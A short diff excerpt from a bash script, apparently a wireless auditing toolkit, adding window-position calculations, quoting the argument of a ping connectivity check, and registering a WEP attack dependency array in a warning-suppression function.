+	sixth_of_seven_position=$((resolution_y / 7 + 4 * (resolution_y / 7) + ywindow_edge_pixels))
+	seventh_of_seven_position=$((resolution_y / 7 + 5 * (resolution_y / 7) + ywindow_edge_pixels))
 }
 
 #Recalculate windows sizes and positions
@@ -8289,7 +8982,7 @@ function check_internet_access() {
 
 	debug_print
 
-	ping -c 1 ${1} -W 1 > /dev/null 2>&1
+	ping -c 1 "${1}" -W 1 > /dev/null 2>&1
 	if [ "$?" = "0" ]; then
 		return 0
 	fi
@@ -8403,6 +9096,7 @@ function remove_warnings() {
 	echo "${reaver_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${bully_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
 	echo "${reaver_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
+	echo "${wep_attack_dependencies[@]}" > /dev/null 2>&1
 	echo "${is_arm}" > /dev/null 2>&1
 }
 
